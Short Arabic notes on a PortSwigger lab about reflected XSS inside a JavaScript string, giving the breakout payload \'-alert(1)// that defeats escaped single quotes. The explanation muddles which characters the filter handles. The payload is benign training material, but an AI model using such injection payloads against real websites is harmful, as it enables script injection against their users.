# Lab : Reflected XSS into a JavaScript string with angle brackets and double quotes HTML - encoded and single quotes escapes

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

- الفكره من الLab ده ان الfirewall بيعمل encode لل single quotes and angel brackets ومبيعملش للsingle quotes

```bash
1. هنستخدم \ علشان نهرب الsingle quotes من الfirewall , نسنخدم الpayload ده 

2. \'-alert(1)//
```
